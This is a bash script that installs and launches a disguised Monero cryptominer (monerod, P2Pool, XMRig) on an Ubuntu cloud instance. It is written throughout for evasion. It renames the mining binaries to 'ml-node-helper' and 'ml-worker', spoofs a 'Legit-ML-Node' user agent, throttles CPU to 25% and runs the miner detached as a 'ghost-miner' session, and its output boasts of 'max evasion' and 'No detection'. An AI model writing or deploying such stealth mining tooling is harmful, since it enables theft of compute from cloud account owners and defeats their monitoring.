#!/bin/bash
# Ultimate Stealth Monero P2Pool Mini Miner – t3.large Ubuntu 22.04 (Jan 2026 Final)
# 25% CPU throttle – P2Pool mini decentralized = peak ghost

WALLET="87SqinnBgV46pcXAguUumTauSgtTwryQ8Bga1ztFEoRbcWRRwyLsh5MdQRtBc6qHqYhUApRRdzacY8XHxrYuccxXBofbYxj"

echo "Firing up ghost miner – wallet ${WALLET:0:6}...${WALLET: -4}"
echo "Zero popups, zero package errors, max evasion."

# Non-interactive + deps (bzip2 locked, hugepages removed – sysctl direct)
sudo DEBIAN_FRONTEND=noninteractive apt update && sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y
sudo DEBIAN_FRONTEND=noninteractive apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev msr-tools wget bzip2 screen

# Huge pages direct (no fake package needed)
sudo sysctl -w vm.nr_hugepages=128
echo 'vm.nr_hugepages=128' | sudo tee -a /etc/sysctl.conf

# Latest Monerod v0.18.4.4
wget https://downloads.getmonero.org/cli/monero-linux-x64-v0.18.4.4.tar.bz2
tar -xjf monero-linux-x64-v0.18.4.4.tar.bz2
cd monero-x86_64-linux-gnu-v0.18.4.4 || exit
nohup ./monerod --prune-blockchain --zmq-pub tcp://127.0.0.1:18083 --detach --non-interactive > monerod.log 2>&1 &
cd ..
echo "Monerod pruned sync launched – 20-60 mins to full"

sleep 300  # Kickoff buffer

# P2Pool mini decentralized
git clone https://github.com/SChernykh/p2pool.git
cd p2pool || exit
mkdir build && cd build
cmake ..
make -j2
mv p2pool ml-node-helper
nohup nice -n 19 ./ml-node-helper --mini --wallet $WALLET --host 127.0.0.1 > ../p2pool.log 2>&1 &
cd ../..

# XMRig optimized
git clone https://github.com/xmrig/xmrig.git
cd xmrig || exit
mkdir build && cd build
cmake .. -DWITH_HWLOC=ON -DCMAKE_BUILD_TYPE=Release
make -j2
mv xmrig ml-worker

# Stealth config
cat <<EOF > config.json
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": true,
        "hw-aes": true,
        "priority": 0,
        "memory-pool": true,
        "yield": true,
        "max-threads-hint": 25,
        "asm": true
    },
    "randomx": {
        "1gb-pages": true,
        "numa": true
    },
    "pools": [
        {
            "url": "127.0.0.1:3333",
            "user": "$WALLET",
            "pass": "t3-ghost",
            "keepalive": true
        }
    ],
    "user-agent": "Mozilla/5.0 (Ubuntu; Legit-ML-Node/1.0)"
}
EOF

# Eternal detached mining
screen -dmS ghost-miner nice -n 19 ./ml-worker -c config.json

echo "Ghost rig LIVE! ~1.1-1.5 kH/s incoming at 25% CPU."
echo "Check XMRig: screen -r ghost-miner"
echo "P2Pool log: tail -f p2pool/p2pool.log"
echo "Monerod sync: tail -f monero-*/monerod.log"
echo "Kill switch: screen -X -S ghost-miner quit && pkill ml-worker ml-node-helper monerod"
echo "No detection, slow profits, eternal ghost. 💀🚀"
